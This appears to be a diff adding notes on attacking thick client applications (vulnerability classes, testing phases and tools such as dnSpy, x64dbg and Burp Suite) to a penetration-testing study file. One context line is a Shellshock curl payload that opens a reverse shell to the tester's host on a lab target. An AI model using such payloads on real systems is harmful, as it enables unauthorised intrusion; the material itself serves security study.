@@ -848,3 +848,48 @@ Then:
 ```
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
 ```
+
+# Attacking Thick Client Applications
+Thick client applications are the applications that are installed locally on our computers. <br>
+In a `.NET` environment, a `thick client`, also known as a `rich client` or `fat client`, refers to an application that performs a significant amount of processing on the client side rather than relying solely on the server for all processing tasks. <br>
+Some examples of thick client applications are web browsers, media players, chatting software, and video games. <br>
+Thick client applications are considered less secure than web applications with many attacks being applicable:
+- Improper Error Handling
+- Hardcoded sensitive data
+- DLL Hijacking
+- Buffer Overflow
+- SQL Injection
+- Insecure Storage
+- Session Management
+
+## Penetration Testing Steps
+### Information Gathering
+In this step, penetration testers have to identify the application architecture, the programming languages and frameworks that have been used, and understand how the application and the infrastructure work. They should also need to identify technologies that are used on the client and server sides and find entry points and user inputs.
+Tools to gather information:
+- [CFF Explorer](https://ntcore.com/explorer-suite/)
+- [Detect It Easy](https://github.com/horsicq/Detect-It-Easy)
+- Process Monitor
+- Strings
+
+### Client Side attacks
+Although thick clients perform significant processing and data storage on the client side, they still communicate with servers for various tasks, such as data synchronization or accessing shared resources. <br>
+Sensitive information like usernames and passwords, tokens, or strings for communication with other services, might be stored in the application's local files. Hardcoded credentials and other sensitive information can also be found in the application's source code.
+Tools:
+- [dnSpy](https://github.com/dnSpy/dnSpy)
+- [x64dbg](https://x64dbg.com/)
+- [JADX](https://github.com/skylot/jadx)
+- [Frida](https://frida.re/)
+
+### Network Side Attacks
+Network traffic analysis will help us capture sensitive information that might be transferred through HTTP/HTTPS or TCP/UDP connection, and give us a better understanding of how that application is working.
+Tools:
+- Wireshark
+- tcpdump
+- TCPView
+- Burp Suite
+
+### Server Side Attacks
+Server-side attacks in thick client applications are similar to web application attacks. We should pay attention to the most common ones including most of the OWASP Top Ten.
+
+
+
